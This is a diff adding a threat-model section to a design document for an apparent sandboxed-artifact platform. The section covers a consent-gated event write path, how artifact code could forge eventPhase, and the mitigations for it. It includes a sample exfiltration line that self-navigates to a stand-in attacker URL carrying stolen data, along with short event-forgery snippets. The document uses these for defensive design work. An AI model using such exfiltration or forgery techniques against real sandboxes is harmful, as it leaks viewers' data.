@@ -210,8 +210,199 @@ The companion script makes no network requests, accesses no parent state, and st
 - `anchor_positions(positions[])` — response to position request
 - `resize(height)` — iframe content height changed, parent adjusts container
 - `open_external(url)` — user clicked `<a target="_blank">` or artifact called `window.open()`; parent validates `https:` and opens a new tab
+- `submit_events(events[])` — consent-gated batch of structured document events the artifact handed back (see "Document events" below); parent POSTs it and answers with `submit_result`
+
+**Parent → Iframe (document events):**
+- `events(rows[])` — `artifact`-audience event rows relayed verbatim, in coalesced batches; re-dispatched to artifact JS as `CustomEvent('primer:events')`
+- `submit_result({ ok, rows?, error? })` — write acknowledgment; re-dispatched as `CustomEvent('primer:submit-result')`
 
 All messages include a shared token established at iframe initialization to reject cross-document interference.
+
+### Document events: the artifact→backend write path (threat model)
+
+Structured document events (issue #78) add the one sanctioned path by which
+data originating INSIDE the sandboxed artifact reaches Primer's backend —
+and, via the `artifact` audience tier, the one path by which stored rows are
+injected back INTO sandboxed artifact code. Both directions are additions to
+the threat model:
+
+- **Write path (artifact → backend).** The sandbox and `connect-src 'none'`
+  still block every direct network path; nothing here loosens them. The
+  artifact can only dispatch `CustomEvent('primer:submit-events')`; the
+  companion forwards it over the MessagePort only when BOTH hold: the
+  dispatch happens **while the trusted gesture event's dispatch is still in
+  progress** (the stored event's UA-managed dispatch phase, read through a
+  captured native getter so neither a prototype redefine nor a per-instance
+  own-property shadow can forge it — see the forging subsection below — plus
+  an `isTrusted` re-check that defeats replaying a captured trusted event
+  through `dispatchEvent()`; NOT a timer- or microtask-retired flag, which
+  real UA dispatch kills at the per-listener microtask checkpoint before the
+  artifact's handler runs; this class is provable only under real input,
+  hence the real-browser consent test tier,
+  `pnpm --filter @primer/api test:browser`),
+  AND the current **physical activation cluster** is unconsumed (detailed
+  below).
+  <br>**Forging `eventPhase` — closed by reading through a captured native
+  getter.** `eventPhase` is forgeable by untrusted artifact JS two ways, and
+  BOTH must be closed: (1) `Event.prototype.eventPhase` is a *configurable*
+  prototype getter in Chrome, so an artifact could
+  `Object.defineProperty(Event.prototype, 'eventPhase', { get: () => 2 })`;
+  and (2) — the subtler one — **the same event instance is handed to every
+  listener in a dispatch, including the artifact's own**, so the event is
+  NOT private to the companion: the artifact captures it in its own listener
+  and defines an own `eventPhase` accessor on the INSTANCE, which a plain
+  property read honors over even a frozen prototype getter. Either forgery
+  makes the in-dispatch check always say "in dispatch", laundering a
+  `setTimeout`-deferred submit past it. Mitigation (defeats both): the upload
+  pipeline injects an inline shim as the **first child of `<head>`** — before
+  any artifact script exists — that captures the pristine native `eventPhase`
+  getter and a native `Reflect.apply`, and publishes a frozen,
+  non-configurable, non-writable global exposing `guard.eventPhase(ev) =
+  Reflect.apply(nativeGetter, ev, [])`. The companion reads the phase through
+  that guard, so it reads the event's internal UA-managed slot directly and
+  never consults either the prototype getter or an instance own-accessor.
+  Correctness rests on "captured before any hostile code runs, then frozen",
+  NOT on freezing the prototype (which the shim also does, as
+  defense-in-depth and to keep the honest path obvious). The
+  `Function.prototype.call`/`.apply` hall-of-mirrors is closed the same way —
+  the apply primitive is a captured reference, invoked directly, never the
+  live (poisonable) global. Audit of the whole class the gate +
+  activation-cluster logic touch: `isTrusted` is per-instance
+  `[LegacyUnforgeable]` (non-configurable, and a prototype poison is shadowed
+  by the instance own property — verified, no fix needed); the cluster keys
+  on the **registered event-type string** (a listener loop variable), never
+  `e.type` off the instance; `MessageEvent`'s `source`/`ports`/`data` getters
+  (init-handshake path only, misuse is self-harm to the artifact's own realm)
+  are frozen by the same shim as behavior-preserving defense-in-depth. See
+  `apps/api/src/upload/eventGuardShim.ts` and the poison/control test pairs
+  (prototype, per-instance, and apply-primitive) in
+  `consent.browser.test.ts`.<br>Two degraded paths, both immaterial to
+  production security: if the guard is present but its native read *throws*
+  unexpectedly, the companion treats the phase as NONE (fail-safe → refuse).
+  If the guard is *absent* entirely, the companion falls back to a plain
+  `e.eventPhase` read — but that is reachable only OUTSIDE the upload
+  pipeline (e.g. the jsdom unit harness that evals `v1.js` with no shim);
+  in a real artifact the pipeline always injects the shim ahead of the
+  companion, so the guard is always present and the plain-read fallback is
+  never taken. Even on that fallback the `isTrusted` re-check (unforgeable)
+  still holds, so the worst case is timing/deferral decoupling of an
+  already-bounded submission — ≤1 per genuine gesture, grant-gated,
+  in-audience, server-attributed — never a no-gesture auto-fire and never a
+  grant bypass.
+  <br>**The activation cluster** (the second necessary condition above): one
+  cluster spans the whole trusted-event burst of one physical interaction
+  (pointer + mouse + touch + compatibility-mouse events of one tap; a
+  keydown-through-keyup keystroke, auto-repeat included). A successful
+  forward consumes the cluster, so **one physical activation authorizes at
+  most one submission** — an artifact with handlers on every gesture event
+  type still cannot turn one incidental tap into several attributed
+  submissions. Checking `navigator.userActivation.isActive` alone is
+  explicitly NOT sufficient — a malicious artifact could defer its dispatch
+  into the activation window of an unrelated click (activation laundering);
+  the in-dispatch condition closes that. An artifact is untrusted code
+  running in every viewer's browser, regardless of what produced it. The
+  parent page remains the sole authed principal: it re-validates the batch
+  and POSTs it; the server validates again and stamps the authenticated user
+  as the row author — attribution can never be asserted from inside the
+  iframe. Writes require the caller to be a document collaborator (owner
+  included); external-share and public viewers cannot authenticate to these
+  routes at all.
+
+- **Element-level intent — RESOLVED by the first-submission grant (issue
+  #78 security requirement 6).** The consent gate's guarantee is per
+  physical activation, not per "Send button": the submit affordance lives
+  INSIDE the untrusted artifact, so the companion cannot distinguish "the
+  reviewer tapped Send" from "the reviewer tapped anything". The mitigation
+  is a **parent-owned first-submission grant**: the first time a given
+  artifact content version attempts an artifact-originated submission on a
+  document, Primer-owned chrome — rendered in the parent page's DOM, which
+  the artifact cannot draw over, dispatch events into, or synthesize
+  acceptance of (the iframe's opaque origin reaches the parent only via the
+  companion MessagePort, which carries data, never UI events) — discloses
+  the envelope (event count, namespaces, and each event's `audience` with
+  its plain-language meaning: who will see the data) and asks the viewer to
+  allow it. Never the payload bytes. The grant persists per (viewer,
+  document, artifact content version): a republished artifact is a new
+  version and re-prompts; a submission carrying a broader audience tier
+  than was granted (author < collaborators < artifact) re-prompts, and
+  batch-splitting cannot bypass that because every submission's required
+  tier is checked independently. While a prompt is open exactly ONE
+  submission is held — the one whose envelope is being disclosed; anything
+  else arriving is refused, so nothing queue-jumps or piggybacks on the
+  grant click. Deny answers the artifact with an error
+  `primer:submit-result`. **Remaining residual:** within an existing grant
+  and within the granted audience tier, a hostile artifact can still ride a
+  genuine physical interaction to submit content the viewer didn't
+  deliberately author — capped at one submission per physical interaction
+  by the activation-cluster gate, always inside the disclosed audience
+  scope, always server-attributed and auditable, and bounded by the
+  batch/payload caps and server-side validation.
+
+- **`artifact` audience tier (backend → artifact).** Every event row carries
+  a required `audience` (`author` | `collaborators` | `artifact`); the
+  server returns to each caller exactly the rows their identity may read.
+  `artifact` is the **injection boundary**: only rows that explicitly
+  declared it are relayed by the parent into the sandboxed iframe, where
+  they become input to untrusted artifact code in every viewer's browser.
+  It must never be collapsed into `collaborators` as a simplification, and
+  no audience is ever inferred from a namespace or payload. Rows are relayed
+  verbatim; Primer never interprets payloads.
+
+- **Payloads are always untrusted.** Event payloads are opaque data. Code
+  consuming them (artifacts, CLIs, services) must parse and validate them,
+  never execute them as instructions; agents consuming them must treat them
+  as feedback to reason about, never commands. This is what keeps a
+  compromised artifact — or a hostile collaborator's writes — from becoming
+  a command channel into consumers.
+
+- **Init handshake is parent-verified.** The companion's init is
+  first-init-wins, so it accepts the handshake message only from the
+  embedding parent frame (`event.source === window.parent` when actually
+  embedded). Without that check the artifact's own JS could post a fake
+  init to its own window and hijack the companion port before the real
+  parent's arrives — a self-DoS plus a fake "parent" feeding the artifact
+  fabricated event rows.
+
+- **Email enumeration on user lookup.** `GET /api/users/lookup?email=`
+  answers 200/404 by whether an org account exists — an authenticated
+  caller can probe addresses. Accepted: the surface is org-authenticated
+  only (same posture as `/api/users` typeahead, which already returns
+  names and emails to any org member), and the id space it reveals is what
+  event attribution requires.
+
+- **Per-connection / per-page memory grows with the stream.** The SSE
+  handler's sent-ids set and the parent page's relayed-rows buffer grow with
+  the document's event count (retention is forever). Accepted for v1: both
+  are bounded by a single document's stream length and by the connection /
+  page lifetime; revisit if any document's stream reaches a size where this
+  matters.
+
+- **The Clipboard API does not work inside the artifact iframe
+  (pre-existing; informational for artifact authors).** The sandboxed,
+  opaque-origin iframe is denied `clipboard-write` by permissions policy,
+  so `navigator.clipboard.writeText(...)` from artifact JS rejects with a
+  policy violation (observed live, 2026-08-26). Artifacts must not build
+  fallback UX on in-iframe clipboard writes (e.g. "couldn't send — copied
+  to clipboard instead" silently does neither); surface data visibly (a
+  selectable text block) or hand it out through the sanctioned channels
+  instead. Not a security gap — one less way for artifact code to touch
+  the viewer's environment — but a known consumer-facing limitation.
+
+- **Navigation is an exfil channel the CSP does not close (pre-existing).**
+  `connect-src 'none'` blocks fetch/XHR/WebSocket and `form-action 'none'`
+  kills native form submission, but nothing blocks the artifact from
+  navigating ITSELF (`location.href = 'https://attacker/?stolen=…'`) —
+  sandboxed iframes may self-navigate without any sandbox token, and the
+  upload pipeline only strips `<meta refresh>`, not scripted navigation.
+  Any data present inside the iframe — the artifact's own content, and now
+  `artifact`-audience event rows relayed in — is therefore exfiltratable by
+  a hostile artifact to a URL of its choosing. Not widened by the events
+  feature in kind (comment anchors and document content were already
+  inside), but widened in value: authors choose `audience: 'artifact'`
+  knowing those rows enter this trust domain. Mitigation options if ever
+  needed: a `navigate-to`-style policy is not implementable today; an
+  interstitial via sandbox navigation restrictions would break legitimate
+  in-artifact links, so this stands as an accepted, documented risk.
 
 ### Anchor resolution & drift handling
 
